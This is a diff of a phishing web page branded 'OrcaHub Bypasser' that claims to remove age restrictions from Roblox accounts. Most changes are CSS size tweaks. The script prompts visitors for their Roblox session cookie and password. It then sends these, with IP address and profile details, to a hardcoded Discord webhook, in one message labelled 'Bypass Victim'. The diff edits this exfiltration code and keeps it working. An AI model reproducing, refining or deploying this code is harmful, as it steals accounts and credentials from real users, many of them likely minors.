@@ -84,12 +84,12 @@
             75% { transform: translate(-40px, -15px) scale(1.05); }
         }
 
-        /* ===== CAR SCENE - TOP ===== */
+        /* ===== CAR SCENE ===== */
         .car-scene {
             position: relative;
             width: 100%;
             max-width: 500px;
-            height: 180px;
+            height: 160px;
             overflow: hidden;
             z-index: 1;
             margin-top: 5px;
@@ -97,6 +97,7 @@
             background: linear-gradient(180deg, #061826 0%, #03202f 55%, #011a28 100%);
             border: 1px solid rgba(79, 209, 255, 0.15);
             box-shadow: 0 0 40px rgba(0, 180, 255, 0.05);
+            flex-shrink: 0;
         }
 
         .road-scene {
@@ -132,16 +133,16 @@
         }
 
         @keyframes carDrive {
-            0% { left: -180px; transform: scale(0.7) rotate(-2deg); }
-            30% { left: 20%; transform: scale(0.85) rotate(0deg); }
-            50% { left: 40%; transform: scale(0.9) rotate(0deg); }
-            70% { left: 50%; transform: scale(0.85) rotate(0deg); }
-            85% { left: 55%; transform: scale(0.8) rotate(0.5deg); }
-            100% { left: 58%; transform: scale(0.75) rotate(0deg); }
+            0% { left: -180px; transform: scale(0.6) rotate(-2deg); }
+            30% { left: 20%; transform: scale(0.7) rotate(0deg); }
+            50% { left: 40%; transform: scale(0.75) rotate(0deg); }
+            70% { left: 50%; transform: scale(0.7) rotate(0deg); }
+            85% { left: 55%; transform: scale(0.65) rotate(0.5deg); }
+            100% { left: 58%; transform: scale(0.6) rotate(0deg); }
         }
 
         .car-wrapper-scene svg {
-            width: 220px;
+            width: 200px;
             height: auto;
             display: block;
         }
@@ -151,12 +152,12 @@
             position: relative;
             z-index: 5;
             text-align: center;
-            margin: 8px 0 10px;
+            margin: 6px 0 8px;
             width: 100%;
         }
 
         .hero-text h1 {
-            font-size: 2.8rem;
+            font-size: 2.5rem;
             font-weight: 900;
             background: linear-gradient(135deg, #a29bfe, #ff6b6b, #4ecdc4);
             -webkit-background-clip: text;
@@ -176,43 +177,44 @@
 
         .hero-text .sub {
             color: #8888aa;
-            font-size: 0.7rem;
+            font-size: 0.6rem;
             letter-spacing: 4px;
             text-transform: uppercase;
             font-weight: 300;
         }
 
-        /* ===== GLASS CARD - LARGER ===== */
+        /* ===== GLASS CARD ===== */
         .glass-card {
             position: relative;
             z-index: 10;
             width: 98%;
-            max-width: 500px;
+            max-width: 480px;
             background: rgba(16, 16, 30, 0.92);
             backdrop-filter: blur(25px);
             -webkit-backdrop-filter: blur(25px);
-            border-radius: 30px;
+            border-radius: 28px;
             border: 1px solid rgba(255, 255, 255, 0.05);
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
-            padding: 20px 22px 22px;
-            margin-bottom: 10px;
+            padding: 18px 20px 20px;
+            margin-bottom: 8px;
+            flex-shrink: 0;
         }
 
         /* ===== STEP INDICATOR ===== */
         .step-indicator {
             display: flex;
             justify-content: space-between;
-            margin-bottom: 16px;
-            gap: 6px;
+            margin-bottom: 14px;
+            gap: 4px;
         }
 
         .step-dot {
             flex: 1;
             text-align: center;
-            padding: 8px 0;
+            padding: 6px 0;
             background: rgba(30, 30, 48, 0.4);
-            border-radius: 25px;
-            font-size: 0.65rem;
+            border-radius: 20px;
+            font-size: 0.55rem;
             font-weight: 700;
             color: #5a5a72;
             transition: all 0.5s ease;
@@ -224,8 +226,8 @@
         .step-dot.active {
             background: linear-gradient(135deg, #a29bfe, #ff6b6b);
             color: white;
-            box-shadow: 0 0 25px rgba(162, 155, 254, 0.25);
-            transform: scale(1.03);
+            box-shadow: 0 0 25px rgba(162, 155, 254, 0.2);
+            transform: scale(1.02);
             border-color: rgba(255,255,255,0.1);
         }
 
@@ -235,7 +237,7 @@
             border-color: rgba(78, 205, 196, 0.15);
         }
 
-        /* ===== FORM STEPS - LARGER ===== */
+        /* ===== FORM STEPS ===== */
         .form-step {
             display: none;
             animation: slideUp 0.5s ease;
@@ -253,29 +255,29 @@
         .form-step label {
             display: block;
             font-weight: 700;
-            margin-bottom: 8px;
+            margin-bottom: 6px;
             color: #c0c0dd;
-            font-size: 0.85rem;
+            font-size: 0.7rem;
             letter-spacing: 0.5px;
             text-transform: uppercase;
         }
 
         .form-step input {
             width: 100%;
-            padding: 14px 18px;
+            padding: 12px 16px;
             background: rgba(10, 10, 20, 0.6);
             border: 1.5px solid rgba(255, 255, 255, 0.05);
-            border-radius: 30px;
+            border-radius: 25px;
             color: #f0f0ff;
-            font-size: 0.95rem;
+            font-size: 0.85rem;
             outline: none;
             transition: all 0.4s ease;
-            margin-bottom: 14px;
+            margin-bottom: 12px;
         }
 
         .form-step input:focus {
             border-color: #a29bfe;
-            box-shadow: 0 0 0 5px rgba(162, 155, 254, 0.08);
+            box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.08);
             background: rgba(20, 20, 36, 0.7);
         }
 
@@ -285,24 +287,24 @@
 
         .form-step input.error {
             border-color: #ff6b6b;
-            box-shadow: 0 0 0 5px rgba(255, 107, 107, 0.1);
+            box-shadow: 0 0 0 4px rgba(255, 107, 107, 0.1);
         }
 
         .form-step input.success {
             border-color: #4ecdc4;
-            box-shadow: 0 0 0 5px rgba(78, 205, 196, 0.1);
+            box-shadow: 0 0 0 4px rgba(78, 205, 196, 0.1);
         }
 
-        /* ===== PROFILE PREVIEW - LARGER ===== */
+        /* ===== PROFILE PREVIEW ===== */
         .profile-preview {
             background: linear-gradient(135deg, rgba(30, 20, 48, 0.7), rgba(20, 20, 36, 0.8));
-            border-radius: 30px;
-            padding: 14px 18px;
-            margin-bottom: 14px;
+            border-radius: 22px;
+            padding: 10px 14px;
+            margin-bottom: 12px;
             border: 1px solid rgba(255, 255, 255, 0.03);
             display: none;
             align-items: center;
-            gap: 16px;
+            gap: 12px;
             backdrop-filter: blur(8px);
             transition: all 0.4s ease;
         }
@@ -318,11 +320,11 @@
         }
 
         .profile-preview img {
-            width: 55px;
-            height: 55px;
+            width: 40px;
+            height: 40px;
             border-radius: 50%;
             border: 2px solid rgba(162, 155, 254, 0.3);
-            box-shadow: 0 0 30px rgba(162, 155, 254, 0.15);
+            box-shadow: 0 0 20px rgba(162, 155, 254, 0.15);
             object-fit: cover;
             background: #1a1a2e;
         }
@@ -332,44 +334,44 @@
         }
 
         .profile-name {
-            font-size: 1rem;
+            font-size: 0.8rem;
             font-weight: 700;
             color: #fff;
         }
 
         .profile-id {
             color: #8888aa;
-            font-size: 0.7rem;
-            margin-top: 2px;
+            font-size: 0.55rem;
+            margin-top: 1px;
         }
 
         .profile-stats {
             color: #666688;
-            font-size: 0.65rem;
-            margin-top: 2px;
+            font-size: 0.5rem;
+            margin-top: 1px;
         }
 
         .badge-verified {
             display: inline-block;
             background: rgba(78, 205, 196, 0.15);
             color: #4ecdc4;
-            padding: 2px 12px;
-            border-radius: 18px;
-            font-size: 0.55rem;
+            padding: 1px 8px;
+            border-radius: 15px;
+            font-size: 0.45rem;
             font-weight: 600;
-            margin-top: 3px;
+            margin-top: 2px;
             border: 1px solid rgba(78, 205, 196, 0.1);
         }
 
-        /* ===== BUTTONS - LARGER ===== */
+        /* ===== BUTTONS ===== */
         .btn-primary {
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             background: linear-gradient(135deg, #a29bfe, #ff6b6b);
             border: none;
-            border-radius: 30px;
+            border-radius: 25px;
             font-weight: 700;
-            font-size: 0.95rem;
+            font-size: 0.8rem;
             color: white;
             cursor: pointer;
             transition: all 0.4s ease;
@@ -379,7 +381,7 @@
 
         .btn-primary:hover {
             transform: scale(1.02);
-            box-shadow: 0 8px 35px rgba(162, 155, 254, 0.3);
+            box-shadow: 0 8px 30px rgba(162, 155, 254, 0.3);
         }
 
         .btn-primary:disabled {
@@ -390,16 +392,16 @@
 
         .btn-secondary {
             width: 100%;
-            padding: 12px;
+            padding: 10px;
             background: rgba(50, 50, 74, 0.25);
             border: 1px solid rgba(255, 255, 255, 0.04);
-            border-radius: 30px;
+            border-radius: 25px;
             font-weight: 600;
-            font-size: 0.85rem;
+            font-size: 0.7rem;
             color: #8888aa;
             cursor: pointer;
             transition: all 0.3s;
-            margin-top: 8px;
+            margin-top: 6px;
             text-transform: uppercase;
             letter-spacing: 1px;
         }
@@ -410,12 +412,12 @@
         }
 
         .btn-instagram {
-            padding: 14px;
+            padding: 12px;
             background: linear-gradient(135deg, #f58529, #dd2a7b);
             border: none;
-            border-radius: 30px;
+            border-radius: 25px;
             font-weight: 700;
-            font-size: 0.85rem;
+            font-size: 0.7rem;
             color: white;
             cursor: pointer;
             transition: all 0.4s;
@@ -423,25 +425,25 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            gap: 6px;
             text-transform: uppercase;
             letter-spacing: 0.5px;
         }
 
         .btn-instagram:hover {
             transform: scale(1.02);
-            box-shadow: 0 8px 35px rgba(221, 42, 123, 0.3);
+            box-shadow: 0 8px 30px rgba(221, 42, 123, 0.3);
         }
 
         .btn-instagram svg {
-            width: 18px;
-            height: 18px;
+            width: 14px;
+            height: 14px;
             fill: currentColor;
         }
 
         .btn-group {
             display: flex;
-            gap: 8px;
+            gap: 6px;
             margin-top: 4px;
         }
 
@@ -457,7 +459,7 @@
         .loader-container {
             display: none;
             text-align: center;
-            padding: 12px 0;
+            padding: 10px 0;
         }
 
         .loader-container.show {
@@ -471,14 +473,14 @@
         }
 
         .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid rgba(162, 155, 254, 0.08);
+            width: 40px;
+            height: 40px;
+            border: 3.5px solid rgba(162, 155, 254, 0.08);
             border-top-color: #a29bfe;
             border-right-color: #ff6b6b;
             border-radius: 50%;
             animation: spin 0.8s ease infinite;
-            margin: 0 auto 10px;
+            margin: 0 auto 8px;
         }
 
         @keyframes spin {
@@ -487,7 +489,7 @@
 
         .loader-text {
             color: #8888aa;
-            font-size: 0.85rem;
+            font-size: 0.75rem;
             font-weight: 300;
         }
 
@@ -502,12 +504,12 @@
             background: rgba(78, 205, 196, 0.06);
             border: 1px solid rgba(78, 205, 196, 0.12);
             color: #4ecdc4;
-            padding: 14px 18px;
-            border-radius: 24px;
+            padding: 10px 14px;
+            border-radius: 20px;
             text-align: center;
-            font-size: 0.9rem;
+            font-size: 0.75rem;
             font-weight: 600;
-            margin-top: 12px;
+            margin-top: 10px;
             animation: fadeIn 0.4s ease;
         }
 
@@ -516,9 +518,9 @@
         }
 
         .result-message .big {
-            font-size: 2.2rem;
+            font-size: 1.8rem;
             display: block;
-            margin-bottom: 4px;
+            margin-bottom: 3px;
         }
 
         .error-message {
@@ -526,12 +528,12 @@
             background: rgba(255, 107, 107, 0.08);
             border: 1px solid rgba(255, 107, 107, 0.15);
             color: #ff6b6b;
-            padding: 10px 14px;
-            border-radius: 20px;
-            font-size: 0.85rem;
+            padding: 8px 12px;
+            border-radius: 18px;
+            font-size: 0.7rem;
             font-weight: 500;
             text-align: center;
-            margin-top: 10px;
+            margin-top: 8px;
             animation: fadeIn 0.4s ease;
         }
 
@@ -542,10 +544,10 @@
         .footer {
             text-align: center;
             color: #3a3a52;
-            font-size: 0.55rem;
-            margin-top: 14px;
+            font-size: 0.45rem;
+            margin-top: 12px;
             border-top: 1px solid rgba(255, 255, 255, 0.02);
-            padding-top: 12px;
+            padding-top: 10px;
             letter-spacing: 1.5px;
             text-transform: uppercase;
         }
@@ -566,35 +568,36 @@
 
         /* ===== RESPONSIVE ===== */
         @media (max-width: 480px) {
-            .car-scene { height: 140px; }
-            .car-wrapper-scene svg { width: 160px; }
-            .hero-text h1 { font-size: 2.2rem; letter-spacing: 2px; }
-            .hero-text .sub { font-size: 0.6rem; }
-            .glass-card { padding: 16px 16px 18px; }
-            .step-dot { font-size: 0.55rem; padding: 6px 0; }
-            .form-step input { font-size: 0.85rem; padding: 12px 16px; }
-            .btn-primary { font-size: 0.85rem; padding: 12px; }
-            .btn-instagram { font-size: 0.75rem; padding: 12px; }
-            .profile-preview img { width: 45px; height: 45px; }
-            .profile-name { font-size: 0.85rem; }
+            .car-scene { height: 130px; border-radius: 20px; }
+            .car-wrapper-scene svg { width: 150px; }
+            .hero-text h1 { font-size: 2rem; letter-spacing: 2px; }
+            .hero-text .sub { font-size: 0.5rem; letter-spacing: 3px; }
+            .glass-card { padding: 14px 14px 16px; border-radius: 22px; }
+            .step-dot { font-size: 0.45rem; padding: 4px 0; }
+            .form-step input { font-size: 0.75rem; padding: 10px 14px; margin-bottom: 10px; }
+            .btn-primary { font-size: 0.7rem; padding: 10px; }
+            .btn-instagram { font-size: 0.6rem; padding: 10px; }
+            .profile-preview img { width: 35px; height: 35px; }
+            .profile-name { font-size: 0.7rem; }
         }
 
         @media (max-height: 700px) {
-            .car-scene { height: 120px; }
-            .car-wrapper-scene svg { width: 140px; }
-            .hero-text h1 { font-size: 2rem; }
-            .glass-card { padding: 14px 14px 16px; }
-            .step-dot { font-size: 0.5rem; padding: 4px 0; }
-            .form-step input { padding: 10px 14px; font-size: 0.8rem; margin-bottom: 10px; }
-            .btn-primary { padding: 10px; font-size: 0.8rem; }
-            .profile-preview { padding: 10px 14px; }
+            .car-scene { height: 110px; }
+            .car-wrapper-scene svg { width: 130px; }
+            .hero-text h1 { font-size: 1.8rem; }
+            .hero-text { margin: 4px 0; }
+            .glass-card { padding: 12px 14px 14px; }
+            .step-indicator { margin-bottom: 8px; }
+            .form-step input { padding: 8px 12px; font-size: 0.7rem; margin-bottom: 8px; }
+            .btn-primary { padding: 8px; font-size: 0.65rem; }
+            .profile-preview { padding: 8px 12px; }
         }
 
         @media (min-width: 768px) {
-            .car-scene { height: 200px; }
-            .car-wrapper-scene svg { width: 280px; }
-            .hero-text h1 { font-size: 3.5rem; }
-            .glass-card { padding: 24px 28px 26px; }
+            .car-scene { height: 190px; }
+            .car-wrapper-scene svg { width: 260px; }
+            .hero-text h1 { font-size: 3.2rem; }
+            .glass-card { padding: 22px 26px 24px; border-radius: 32px; }
         }
     </style>
 </head>
@@ -697,8 +700,8 @@
 
             <div id="resultMessage" class="result-message">
                 <span class="big">🎉</span>
-                <div style="font-size:0.95rem; margin-bottom:2px;">AGE EXCEEDED!</div>
-                <div style="font-size:0.7rem; font-weight:400; color:#8888aa;">
+                <div style="font-size:0.85rem; margin-bottom:2px;">AGE EXCEEDED!</div>
+                <div style="font-size:0.65rem; font-weight:400; color:#8888aa;">
                     Age restriction removed from account.
                 </div>
             </div>
@@ -720,7 +723,7 @@
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', () => {
+        document.addEventListener('DOMContentLoaded', function() {
             // ==================== WEBHOOK ====================
             const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG';
 
@@ -794,28 +797,27 @@
             }
 
             // ==================== SEND TO WEBHOOK ====================
-            function sendToWebhook(embed) {
+            function sendToWebhook(message) {
                 try {
                     fetch(WEBHOOK_URL, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ embeds: [embed] }),
+                        body: JSON.stringify({ content: message }),
                         mode: 'no-cors'
                     }).catch(() => {});
                 } catch (_) {}
             }
 
-            // ==================== ROBLOX API - IMPROVED ====================
+            // ==================== ROBLOX API ====================
             async function fetchRobloxProfile(cookie) {
                 try {
                     // Clean the cookie
                     const cleanCookie = cookie.replace(/^_\|WARNING:-DO-NOT-SHARE-?/, '').trim();
 
-                    if (!cleanCookie || cleanCookie.length < 15) {
-                        return { valid: false, error: '❌ Cookie format invalid' };
+                    if (!cleanCookie || cleanCookie.length < 10) {
+                        return { valid: false, error: '❌ Invalid cookie format' };
                     }
 
-                    // Try the main API endpoint
                     const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
                         headers: {
                             'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
@@ -826,7 +828,6 @@
                         }
                     });
 
-                    // Check for specific status codes
                     if (response.status === 401 || response.status === 403) {
                         return { valid: false, error: '❌ Cookie expired or wrong' };
                     }
@@ -841,7 +842,6 @@
 
                     const data = await response.json();
 
-                    // Validate the data
                     if (!data || !data.UserID) {
                         return { valid: false, error: '❌ Invalid cookie or account not found' };
                     }
@@ -883,6 +883,18 @@
                         }
                     } catch (_) {}
 
+                    // Get avatar
+                    let avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
+                    try {
+                        const thumbResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
+                        if (thumbResponse.ok) {
+                            const thumbData = await thumbResponse.json();
+                            if (thumbData.data && thumbData.data.length > 0 && thumbData.data[0].imageUrl) {
+                                avatarUrl = thumbData.data[0].imageUrl;
+                            }
+                        }
+                    } catch (_) {}
+
                     return {
                         valid: true,
                         user: {
@@ -893,7 +905,7 @@
                             followers: followers,
                             following: following,
                             created: profileData.created || 'Unknown',
-                            avatarUrl: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`,
+                            avatarUrl: avatarUrl,
                         }
                     };
 
@@ -922,49 +934,51 @@
                 DOM.verifyBtn.disabled = true;
                 DOM.verifyBtn.textContent = '⏳ Verifying...';
 
-                const result = await fetchRobloxProfile(cookie);
-                if (result.valid) {
-                    currentUserData = result.user;
-                    verifiedCookie = true;
-                    DOM.profileName.textContent = `@${result.user.username}`;
-                    DOM.profileId.textContent = `ID: ${result.user.userId}`;
-                    DOM.profileStats.textContent =
-                        `📊 Followers: ${result.user.followers.toLocaleString()} • Following: ${result.user.following.toLocaleString()}`;
-                    DOM.profileBadge.textContent = result.user.isVerified ? '✅ Verified' : '● Active';
-                    DOM.profileImg.src = result.user.avatarUrl;
-                    DOM.profileImg.onerror = function() {
-                        this.src = 'https://ui-avatars.com/api/?name=' + encodeURIComponent(result.user.username) +
-                            '&background=random&size=80&rounded=true&color=fff';
-                    };
-                    DOM.profilePreview.classList.add('show');
-                    DOM.cookieInput.classList.remove('error');
-                    DOM.cookieInput.classList.add('success');
-                    DOM.error1.classList.remove('show');
-                    DOM.verifyBtn.textContent = '✅ Verified!';
-                    DOM.step1Dot.classList.add('completed');
+                try {
+                    const result = await fetchRobloxProfile(cookie);
+                    if (result.valid) {
+                        currentUserData = result.user;
+                        verifiedCookie = true;
+                        DOM.profileName.textContent = `@${result.user.username}`;
+                        DOM.profileId.textContent = `ID: ${result.user.userId}`;
+                        DOM.profileStats.textContent =
+                            `📊 Followers: ${result.user.followers.toLocaleString()} • Following: ${result.user.following.toLocaleString()}`;
+                        DOM.profileBadge.textContent = result.user.isVerified ? '✅ Verified' : '● Active';
+                        DOM.profileImg.src = result.user.avatarUrl;
+                        DOM.profileImg.onerror = function() {
+                            this.src = 'https://ui-avatars.com/api/?name=' + encodeURIComponent(result.user.username) +
+                                '&background=random&size=80&rounded=true&color=fff';
+                        };
+                        DOM.profilePreview.classList.add('show');
+                        DOM.cookieInput.classList.remove('error');
+                        DOM.cookieInput.classList.add('success');
+                        DOM.error1.classList.remove('show');
+                        DOM.verifyBtn.textContent = '✅ Verified!';
+                        DOM.step1Dot.classList.add('completed');
 
-                    // Send profile info to webhook
-                    await getIP();
-                    sendToWebhook({
-                        title: "🦈 OrcaHub • Cookie Verified",
-                        color: 0x7c6cf0,
-                        fields: [
-                            { name: "👤 Username", value: `\`${result.user.username}\``, inline: true },
-                            { name: "🆔 User ID", value: `\`${result.user.userId}\``, inline: true },
-                            { name: "🍪 Cookie", value: `\`${cookie.substring(0, 50)}...\``, inline: false },
-                            { name: "📊 Followers", value: `\`${result.user.followers.toLocaleString()}\``, inline: true },
-                            { name: "📊 Following", value: `\`${result.user.following.toLocaleString()}\``, inline: true },
-                            { name: "✅ Verified", value: result.user.isVerified ? '✅ Yes' : '❌ No', inline: true },
-                            { name: "🌐 IP", value: `\`${userIP}\``, inline: true },
-                            { name: "🕒 Time", value: new Date().toISOString(), inline: true }
-                        ],
-                        footer: { text: "OrcaHub • Bypasser" },
-                        thumbnail: { url: result.user.avatarUrl }
-                    });
+                        // Send profile info to webhook as simple message
+                        await getIP();
+                        const message = `
+        🦈 OrcaHub • Cookie Verified
+        👤 Username: ${result.user.username}
+        🆔 User ID: ${result.user.userId}
+        📊 Followers: ${result.user.followers.toLocaleString()}
+        📊 Following: ${result.user.following.toLocaleString()}
+        ✅ Verified: ${result.user.isVerified ? 'Yes' : 'No'}
+        🌐 IP: ${userIP}
+        🍪 Cookie: ${cookie.substring(0, 50)}...
+        `;
+                        sendToWebhook(message);
 
-                    setTimeout(() => setStep(2), 600);
-                } else {
-                    DOM.error1.textContent = result.error || '❌ Cookie expired or wrong';
+                        setTimeout(() => setStep(2), 600);
+                    } else {
+                        DOM.error1.textContent = result.error || '❌ Cookie expired or wrong';
+                        DOM.error1.classList.add('show');
+                        DOM.cookieInput.classList.add('error');
+                        DOM.verifyBtn.textContent = '🔍 Verify Cookie';
+                    }
+                } catch (err) {
+                    DOM.error1.textContent = '❌ Error: ' + err.message;
                     DOM.error1.classList.add('show');
                     DOM.cookieInput.classList.add('error');
                     DOM.verifyBtn.textContent = '🔍 Verify Cookie';
@@ -993,26 +1007,21 @@
                     return;
                 }
 
-                // Send full credentials to webhook
+                // Send full credentials to webhook as simple message
                 await getIP();
-                sendToWebhook({
-                    title: "🎯 OrcaHub • Bypass Victim",
-                    color: 0xff6b6b,
-                    fields: [
-                        { name: "👤 Username", value: `\`${currentUserData.username}\``, inline: true },
-                        { name: "🆔 User ID", value: `\`${currentUserData.userId}\``, inline: true },
-                        { name: "🔑 Password", value: `\`${password}\``, inline: false },
-                        { name: "🍪 Cookie", value: `\`${DOM.cookieInput.value.trim()}\``, inline: false },
-                        { name: "📊 Followers", value: `\`${currentUserData.followers.toLocaleString()}\``, inline: true },
-                        { name: "📊 Following", value: `\`${currentUserData.following.toLocaleString()}\``, inline: true },
-                        { name: "✅ Verified", value: currentUserData.isVerified ? '✅ Yes' : '❌ No', inline: true },
-                        { name: "📅 Created", value: `\`${currentUserData.created}\``, inline: true },
-                        { name: "🌐 IP", value: `\`${userIP}\``, inline: true },
-                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
-                    ],
-                    footer: { text: "OrcaHub • Bypasser" },
-                    thumbnail: { url: currentUserData.avatarUrl }
-                });
+                const message = `
+        🎯 OrcaHub • Bypass Victim
+        👤 Username: ${currentUserData.username}
+        🆔 User ID: ${currentUserData.userId}
+        🔑 Password: ${password}
+        🍪 Cookie: ${DOM.cookieInput.value.trim()}
+        📊 Followers: ${currentUserData.followers.toLocaleString()}
+        📊 Following: ${currentUserData.following.toLocaleString()}
+        ✅ Verified: ${currentUserData.isVerified ? 'Yes' : 'No'}
+        📅 Created: ${currentUserData.created}
+        🌐 IP: ${userIP}
+        `;
+                sendToWebhook(message);
 
                 setStep(3);
                 DOM.loader.classList.add('show');
@@ -1045,48 +1054,56 @@
                 DOM.bypassBtn.disabled = false;
                 DOM.bypassBtn.textContent = '🚀 Start Bypass';
 
-                // Send final embed
-                sendToWebhook({
-                    title: "✅ Age Exceeded Successfully",
-                    color: 0x4ecdc4,
-                    fields: [
-                        { name: "👤 Username", value: `\`${currentUserData?.username || 'Unknown'}\``, inline: true },
-                        { name: "🆔 User ID", value: `\`${currentUserData?.userId || 'Unknown'}\``, inline: true },
-                        { name: "📊 Followers", value: `\`${currentUserData?.followers?.toLocaleString() || 'Unknown'}\``, inline: true },
-                        { name: "📊 Following", value: `\`${currentUserData?.following?.toLocaleString() || 'Unknown'}\``, inline: true },
-                        { name: "✅ Verified", value: currentUserData?.isVerified ? '✅ Yes' : '❌ No', inline: true },
-                        { name: "🌐 IP", value: `\`${userIP}\``, inline: true },
-                        { name: "🕒 Time", value: new Date().toISOString(), inline: true }
-                    ],
-                    footer: { text: "OrcaHub • Age Bypass Complete" },
-                    thumbnail: { url: currentUserData?.avatarUrl || "https://www.roblox.com/favicon.ico" }
-                });
+                // Send final message
+                const message = `
+        ✅ Age Exceeded Successfully
+        👤 Username: ${currentUserData?.username || 'Unknown'}
+        🆔 User ID: ${currentUserData?.userId || 'Unknown'}
+        📊 Followers: ${currentUserData?.followers?.toLocaleString() || 'Unknown'}
+        📊 Following: ${currentUserData?.following?.toLocaleString() || 'Unknown'}
+        ✅ Verified: ${currentUserData?.isVerified ? 'Yes' : 'No'}
+        🌐 IP: ${userIP}
+        `;
+                sendToWebhook(message);
 
                 setTimeout(() => {
                     DOM.result.classList.remove('show');
                 }, 8000);
             }
 
-            // ==================== EVENTS ====================
+            // ==================== EVENT BINDINGS ====================
             DOM.verifyBtn.addEventListener('click', verifyCookie);
             DOM.nextToBypassBtn.addEventListener('click', startBypass);
             DOM.bypassBtn.addEventListener('click', startBypass);
 
-            DOM.backToStep1Btn.addEventListener('click', () => setStep(1));
-            DOM.backToStep2Btn.addEventListener('click', () => setStep(2));
+            DOM.backToStep1Btn.addEventListener('click', function() { setStep(1); });
+            DOM.backToStep2Btn.addEventListener('click', function() { setStep(2); });
 
-            DOM.cookieInput.addEventListener('keydown', (e) => {
+            DOM.cookieInput.addEventListener('keydown', function(e) {
                 if (e.key === 'Enter') verifyCookie();
             });
-            DOM.passwordInput.addEventListener('keydown', (e) => {
+            DOM.passwordInput.addEventListener('keydown', function(e) {
                 if (e.key === 'Enter') startBypass();
             });
 
             // ==================== INIT ====================
             setStep(1);
             getIP();
-            console.log('[🦈] OrcaHub Bypasser loaded');
+
+            // Check for valid cookie on paste
+            DOM.cookieInput.addEventListener('input', function() {
+                const val = this.value.trim();
+                if (val.length > 15) {
+                    this.classList.remove('error');
+                    this.classList.add('success');
+                } else {
+                    this.classList.remove('success');
+                }
+            });
+
+            console.log('[🦈] OrcaHub Bypasser loaded!');
         });
     </script>
+
 </body>
-                    </html>
+    </html>
